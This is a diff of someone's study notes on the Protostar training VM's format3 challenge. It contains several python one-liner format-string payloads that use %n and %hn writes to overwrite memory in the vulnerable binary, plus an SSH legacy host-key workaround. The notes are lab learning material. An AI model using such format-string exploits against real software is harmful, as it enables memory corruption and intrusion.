@@ -92,11 +92,13 @@ Interesting walkthrough done on reversing executables in 64bit and 32bit while o
 
     2. 2byte
 
-        - Did not really understand the method that they used
+        - Did not really understand the method that they used:
 
-        - `python -c 'print "\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%250x%13$hn" + "%21570x%12$hn"' | /opt/protostar/bin/format3`
+            `python -c 'print "\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%250x%13$hn" + "%21570x%12$hn"' | /opt/protostar/bin/format3`
 
-        - `python -c 'print "\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%21820x%12$n" + "%43966x%13$n" ' | /opt/protostar/bin/format3`
+        - Improvised from 1byte method
+
+            `python -c 'print "\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%21820x%12$n" + "%43966x%13$n" ' | /opt/protostar/bin/format3`
 
         - Workings
 
@@ -117,7 +119,7 @@ Interesting walkthrough done on reversing executables in 64bit and 32bit while o
 
         - `python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "\xf7\x96\x04\x08" + "%52x%12$n" + "%17x%13$n" + "%173x%14$n" + "%255x%15$n"' | /opt/protostar/bin/format3`
 
-### SSH problems
+### SSH problem fix (no matching host key type found)
 
 ssh -oHostKeyAlgorithms=+ssh-dss XXX@XXX.XXX.XXX.XXX
 
